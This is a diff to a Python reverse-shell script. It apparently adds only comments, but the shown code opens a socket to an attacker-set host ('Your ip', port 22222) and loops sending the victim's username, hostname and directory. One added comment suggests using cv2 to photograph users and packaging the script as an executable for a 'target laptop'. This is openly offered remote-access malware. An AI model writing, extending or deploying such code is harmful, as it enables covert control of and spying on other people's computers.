@@ -1,3 +1,4 @@
+#import modules
 import socket
 import subprocess
 import os
@@ -5,18 +6,18 @@ import platform
 import getpass
 import colorama
 #import cv2
+#cv2 can be added to take pictures of users if you are trying to expirement further, however this will pose some issues with pytoexe if the target laptop doesnt already have tehse modules and python isntalled
 from colorama import Fore, Style
 from time import sleep
 
+#initial modules and variables
 colorama.init()
-
-
 RHOST = "Your ip"
 RPORT = 22222
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((RHOST, RPORT))
 
-
+#initialize main loop
 while True:
     try:
         header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
@@ -98,3 +99,4 @@ Processor Architecture: {platform.processor()}
     except Exception as e:
         sock.send("An error has occured: {}".format(str(e)).encode())
 sock.close()
+# closing connection
